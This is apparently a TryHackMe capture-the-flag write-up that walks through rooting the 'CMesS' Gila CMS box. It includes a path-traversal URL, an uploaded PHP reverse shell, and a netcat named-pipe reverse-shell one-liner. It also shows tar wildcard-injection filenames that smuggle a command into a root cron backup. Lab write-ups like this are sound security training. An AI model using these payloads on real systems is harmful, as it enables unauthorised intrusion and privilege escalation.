# TryHackMe CMesS
Can you root this Gila CMS box?
The challenge page tells us to add `<box IP> cmess.thm to /etc/hosts` so let's do that first.

---

## NMAP results
Let's start off by running our nmap scan

![nmap](/assets/img/thm/cmess/nmap.png)

We can see that there's 2 ports open `port 22` and `port 80`.
> `port 22 - OpenSSH 7.2p2`
>`port 80 - Apache httpd 2.4.18`

---

## Searchsploit
looking up Gila CMS on searchsploit we seem to have 2 exploits:

![gila](/assets/img/thm/cmess/gila.png)

Looks like we have some sort of local file inclusion

Examining the file:

![lfi](/assets/img/thm/cmess/lfi.png)

We'll have to find credentials to the admin panel, then navigate to the LFI link.
`/admin/fm/?f=src../../../../../../../../../WINDOWS/system32/drivers/etc/hosts`

---

## Website

![website](/assets/img/thm/cmess/website.png)

Not an interesting page.

Running `dirsearch` on target, we can see we have a `/admin` directory. Let's visit it.

![admin](/assets/img/thm/cmess/dirsearch.png)

When running `wfuzz`:

`wfuzz -c -f subdomains.txt -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://cmess.thm/" -H "Host: FUZZ.cmess.thm" --hl 107`

![wfuzz](/assets/img/thm/cmess/wfuzz.png)

We have found one subdomain, we'll add this to our `/etc/hosts` file as well. 

Visiting the subdomain: `dev.cmess.thm`

![dev](/assets/img/thm/cmess/dev.png)

We can see that the password for andre has been reset and the new password has been given.

`Password: KPFTN_f2yxe%`
He stated that he's unable to get onto the admin panel
So let's try these credentials with the admin page:

`Email: andre@cmess.thm`
`Password: KPFTN_f2yxe%`

![admin](/assets/img/thm/cmess/admin.png)

Appending: `/admin/fm/?f=src../../../../../../../../../WINDOWS/system32/drivers/etc/hosts`

![LFI2](/assets/img/thm/cmess/lfi2.png)

Looks like it didn't do anything as we can just navigate to this ourselves via clicking `Content > File Manager` however, this has an upload function so let's try uploading a php reverse shell

You can get one from: [Here](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)
or navigate on your host machine and go to `/usr/share/webshells/php` and edit the `php-reverse-shell.php` file and change your IP and the port you want.

Upload your reverse shell and navigate to the `assets` directory. You'll see your reverse shell nested in there:

![revshell](/assets/img/thm/cmess/revshell.png)

Let's start our listener with `nc -lvnp <port used in revshell>` and navigate to our reverse shell to trigger it. `http://cmess.thm/assets/php-reverse-shell.php`

---

## User

GREAT!

![shell](/assets/img/thm/cmess/shell.png)

Looks like we can't `cd` into andre so we'll have to find ways around this

![andre](/assets/img/thm/cmess/andre.png)

---

## Privesc

We can get [LinEnum](https://github.com/rebootuser/LinEnum) onto the box by spinning up a python server with `python3 -m http.server` on host machine then navigate to a writeable directory such as `/tmp` on target machine `wget <host IP>:8000/LinEnum.sh`

We can see an interesting cron running

![cron](/assets/img/thm/cmess/crontab.png)

Towards the end of `LinEnum`, we see 

![lin](/assets/img/thm/cmess/endlin.png)

Let's `cd` into `/opt` and view that `.bak` file.

![backup](/assets/img/thm/cmess/backup.png)

It notes that andre's backup password is `UQfsdCB7aAP6`

Let's try SSH this time and see if we can't login as andre.

Looks like it worked:

![ssh](/assets/img/thm/cmess/ssh.png)

user flag is in current working directory.

---

## Root

One cool tool we can use is called [linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

So let's do  as we did with LinEnum and setup a server on our host and wget the linPEAS file.

Remember back when we found the crontab, this will come in handy. linPEAS found the cron to be using what's called wildcard options

![cronlin](/assets/img/thm/cmess/cronpeas.png)

The Slash is used as an interval.
This can be used with a range or wild card to run at a specified interval.

These wildcards go as follows: `minute, hour, day of month, month, day of week`. So in this case `*/2 * * * *` means update every 2 minutes. This cron is running a tar command to backup the andre's “backup” directory

We can read about tar wildcard injection: [Here](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/)

We will need to create our payload from our host machine.
`msfvenom -p cmd/unix/reverse_netcat lhost=$HOST lport=$PORT R`

Now that we have our payload `mkfifo /tmp/wxejkej; nc <your IP> 1337 0</tmp/wxejkej | /bin/sh >/tmp/wxejkej 2>&1; rm /tmp/wxejkej`

All we have to do is a few commands:
Make sure you have your listener up with the right port from your payload.

Run these commands on target:
>`echo "mkfifo /tmp/wxejkej; nc <your IP> 1337 0</tmp/wxejkej | /bin/sh >/tmp/wxejkej 2>&1; rm /tmp/wxejkej" > shell.sh`
> `echo "" > "--checkpoint-action=exec=sh shell.sh"`
> `echo "" > --checkpoint=1`

Now all we have to do is wait for a callback and we should get root.

BINGO!!

![root](/assets/img/thm/cmess/root.png)

Root flag will be in `/root`
